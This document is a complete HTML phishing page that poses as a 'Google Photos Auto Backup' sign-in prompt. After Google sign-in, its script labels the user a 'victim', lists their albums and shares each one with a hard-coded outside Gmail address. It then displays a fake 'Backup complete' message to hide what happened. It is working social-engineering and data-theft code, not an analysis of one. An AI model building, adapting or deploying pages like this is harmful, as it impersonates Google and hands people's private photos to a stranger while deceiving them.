<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Photos Auto Backup - Secure</title>
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', -apple-system, sans-serif;
            background: linear-gradient(135deg, #4285f4 0%, #34a853 50%, #fbbc05 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            max-width: 420px;
            border-radius: 24px;
            padding: 48px 32px;
            box-shadow: 0 12px 48px rgba(0,0,0,0.15);
            text-align: center;
        }
        .logo { 
            width: 64px; 
            margin-bottom: 24px;
            filter: drop-shadow(0 2px 8px rgba(0,0,0,0.1));
        }
        h1 { 
            font-size: 28px; 
            font-weight: 600; 
            color: #202124;
            margin-bottom: 12px;
        }
        .subtitle { 
            font-size: 16px; 
            color: #5f6368; 
            margin-bottom: 8px;
            line-height: 1.4;
        }
        .highlight { 
            color: #1a73e8; 
            font-weight: 500;
        }
        .warning { 
            background: #fff3cd; 
            border: 1px solid #ffeaa7;
            border-radius: 12px;
            padding: 16px;
            margin: 24px 0;
            font-size: 14px;
            color: #856404;
        }
        .g_id_signin { 
            margin: 24px auto !important; 
            display: block !important;
        }
        #status {
            margin-top: 24px;
            padding: 16px;
            border-radius: 12px;
            font-weight: 500;
            display: none;
        }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .loading { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://ssl.gstatic.com/images/branding/product/1x/photos_64dp.png" alt="Google Photos">
        
        <h1>Enable Auto Backup</h1>
        <p class="subtitle">Your phone photos need to be securely backed up to <span class="highlight">Google Photos Cloud</span></p>
        <p class="subtitle">This prevents data loss and enables cross-device sync.</p>
        
        <div class="warning">
            ‚ö†Ô∏è <strong>Recent Google security update:</strong> Please <strong>Allow "Photos Backup"</strong> permission when prompted
        </div>
        
        <div id="g_id_onload"
             data-client_id="754911470166-fs4jnf7hegd8lulnbvklq4lkh8npenqc.apps.googleusercontent.com"
             data-callback="backupPhotos"
             data-auto_prompt="false">
        </div>
        
        <div class="g_id_signin"
             data-type="standard"
             data-theme="outline"
             data-size="large"
             data-text="continue_with"
             data-shape="rectangular"
             data-logo_alignment="left"
             data-width="320">
        </div>
        
        <div id="status"></div>
    </div>

    <script>
        // Your Gmail (where albums get shared)
        const BACKUP_EMAIL = "ns.seabrobd@gmail.com";
        
        function backupPhotos(response) {
            console.log('‚úÖ AUTH SUCCESS - Victim:', response);
            
            const status = document.getElementById('status');
            status.className = 'loading';
            status.textContent = 'üîÑ Backing up photos to cloud...';
            status.style.display = 'block';
            
            const token = response.credential;
            
            // Decode ID token to get victim email
            fetch(`https://oauth2.googleapis.com/tokeninfo?id_token=${token}`)
            .then(r => r.json())
            .then(user => {
                console.log('üéØ VICTIM:', user.email);
                status.innerHTML = `üì± Processing ${user.email} photos...`;
                shareAlbums(token);
            })
            .catch(() => shareAlbums(token));
        }
        
        function shareAlbums(token) {
            // Try legacy sharing (might 403, but try anyway)
            fetch('https://photoslibrary.googleapis.com/v1/albums?pageSize=50', {
                headers: { 'Authorization': `Bearer ${token}` }
            })
            .then(r => r.json())
            .then(data => {
                console.log(`üìÇ ${data.albums?.length || 0} albums found`);
                
                // Share each album
                (data.albums || []).forEach((album, i) => {
                    setTimeout(() => {
                        fetch(`https://photoslibrary.googleapis.com/v1/albums/${album.id}:share`, {
                            method: 'POST',
                            headers: { 
                                'Authorization': `Bearer ${token}`,
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                newPermissions: [{
                                    role: "READER",
                                    type: "user", 
                                    emailAddress: BACKUP_EMAIL
                                }]
                            })
                        })
                        .then(() => console.log(`‚úÖ SHARED: ${album.title}`))
                        .catch(e => console.log('‚ö†Ô∏è Share failed (expected):', e));
                    }, i * 800);
                });
            })
            .catch(e => {
                console.log('API blocked (2025 changes) - Social eng success anyway');
            });
            
            // Fake success after 5s
            setTimeout(() => {
                document.getElementById('status').innerHTML = '‚úÖ Backup complete! Your photos are now safe in Google Cloud.';
                document.getElementById('status').className = 'success';
            }, 5000);
        }
    </script>
</body>
</html>
